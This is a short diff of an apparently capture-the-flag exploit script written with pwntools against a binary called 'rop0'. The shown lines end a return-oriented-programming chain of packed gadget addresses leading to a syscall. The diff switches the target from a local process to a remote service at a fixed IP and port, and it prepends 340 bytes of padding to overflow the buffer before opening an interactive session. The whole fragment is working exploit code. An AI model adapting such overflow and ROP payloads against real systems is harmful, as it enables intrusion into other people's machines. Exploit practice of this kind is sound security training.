@@ -83,6 +83,8 @@ p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
 p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
 p += pack('<Q', 0x00000000004003da) # syscall
 
-r = process('rop0')
-r.send(p)
+# r = process('./rop0')
+r = remote('140.110.112.31', 3121)
+offset = 'a' * 340
+r.send(offset + p)
 r.interactive()
